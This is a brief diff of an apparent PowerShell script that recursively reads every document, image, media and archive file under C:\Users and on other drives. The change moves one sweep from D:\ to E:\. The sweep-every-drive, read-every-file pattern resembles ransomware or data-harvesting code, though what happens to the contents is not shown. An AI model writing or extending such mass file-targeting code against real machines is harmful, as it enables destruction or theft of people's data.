@@ -41,7 +41,7 @@ gci C:\Users -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc"
     catch{}
 }
 
-gci D:\ -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
+gci E:\ -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
 
    try{
        $file = Get-Content $_ -raw;
